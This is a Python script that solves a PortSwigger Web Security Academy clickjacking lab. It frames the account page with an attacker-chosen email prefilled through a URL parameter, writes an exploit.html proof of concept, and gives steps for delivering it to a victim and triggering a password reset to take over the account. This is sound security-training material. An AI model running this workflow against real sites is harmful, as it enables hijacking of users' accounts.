"""
Lab 2: Clickjacking with form input data prefilled from a URL parameter
https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
Difficulty: Apprentice

📝 The flaw: the "update email" form on the account page reads its initial
value from a query parameter (e.g. ?email=...). One disguised click submits
a form that's ALREADY pre-filled with an email address we chose — setting up
takeover of the victim's account via password reset to that address.
"""

from utils import get_session, log, note, check_framing_defenses, build_prefilled_overlay_poc

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
ATTACKER_EMAIL = "attacker@evil-user.net"
VULNERABLE_PAGE = f"{TARGET}/my-account?email={ATTACKER_EMAIL}"


def run():
    s = get_session()
    check_framing_defenses(s, f"{TARGET}/my-account")

    note(f"Framing /my-account with ?email={ATTACKER_EMAIL} already in the URL —")
    note("the form field is pre-populated before the victim ever clicks.")

    html = build_prefilled_overlay_poc(VULNERABLE_PAGE, button_top="330px", button_left="60px")

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")

    note("Align the decoy over the 'Update email' submit button, deliver to")
    note("victim, then trigger a password reset — it'll go to your address.")


if __name__ == "__main__":
    run()
